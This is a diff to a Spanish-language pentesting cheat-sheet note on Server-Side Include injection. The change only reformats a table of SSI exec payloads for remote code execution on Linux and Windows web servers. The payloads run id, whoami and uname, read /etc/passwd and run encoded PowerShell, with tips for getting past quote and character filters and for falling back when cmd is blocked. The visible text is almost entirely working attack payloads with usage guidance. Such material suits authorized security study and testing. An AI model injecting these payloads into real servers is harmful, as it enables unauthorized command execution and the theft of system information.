@@ -21,18 +21,18 @@ linked:
 
 ## RCE Linux / Windows Básico
 
-| **Payload** | **Qué obtenés** | **Cuándo** |
-|---|---|---|
-| `<!--#exec cmd="id" -->` | uid/gid del usuario del webserver | Probe estándar de RCE |
-| `<!--#exec cmd="whoami" -->` | Nombre del usuario (www-data/apache/IUSR) | Confirmar contexto |
-| `<!--#exec cmd="uname -a" -->` | Kernel + arquitectura | Buscar CVEs de kernel post-RCE |
-| `<!--#exec cmd="dir C:\\" -->` | Listado de `C:\` | Target Windows/IIS |
-| `<!--#exec cmd="powershell.exe -enc <base64>" -->` | Ejecuta payload PowerShell codificado | Evadir filtros de caracteres en Windows |
-| `<!--#exec cmd="cat /etc/passwd" -->` | Usuarios del sistema | Lectura directa de archivo |
-| `<!--#exec cmd="id; whoami; hostname" -->` | id + user + hostname encadenados | Recon en un solo disparo |
-| `<!--#exec cmd='id' -->` | Mismo RCE con comillas simples | Si `"` está filtrado |
-| `<!--#exec cmd=id -->` | RCE sin comillas | Parsers permisivos |
-| `<!--#exec cgi="/cgi-bin/foo" -->` | Ejecuta un CGI y embebe su salida | Cuando `cmd` está bloqueado |
+| **Payload**                                        | **Qué obtenés**                           | **Cuándo**                              |
+| -------------------------------------------------- | ----------------------------------------- | --------------------------------------- |
+| `<!--#exec cmd="id" -->`                           | uid/gid del usuario del webserver         | Probe estándar de RCE                   |
+| `<!--#exec cmd="whoami" -->`                       | Nombre del usuario (www-data/apache/IUSR) | Confirmar contexto                      |
+| `<!--#exec cmd="uname -a" -->`                     | Kernel + arquitectura                     | Buscar CVEs de kernel post-RCE          |
+| `<!--#exec cmd="dir C:\\" -->`                     | Listado de `C:\`                          | Target Windows/IIS                      |
+| `<!--#exec cmd="powershell.exe -enc <base64>" -->` | Ejecuta payload PowerShell codificado     | Evadir filtros de caracteres en Windows |
+| `<!--#exec cmd="cat /etc/passwd" -->`              | Usuarios del sistema                      | Lectura directa de archivo              |
+| `<!--#exec cmd="id; whoami; hostname" -->`         | id + user + hostname encadenados          | Recon en un solo disparo                |
+| `<!--#exec cmd='id' -->`                           | Mismo RCE con comillas simples            | Si `"` está filtrado                    |
+| `<!--#exec cmd=id -->`                             | RCE sin comillas                          | Parsers permisivos                      |
+| `<!--#exec cgi="/cgi-bin/foo" -->`                 | Ejecuta un CGI y embebe su salida         | Cuando `cmd` está bloqueado             |
 
 ^ssi-exec-basic
 
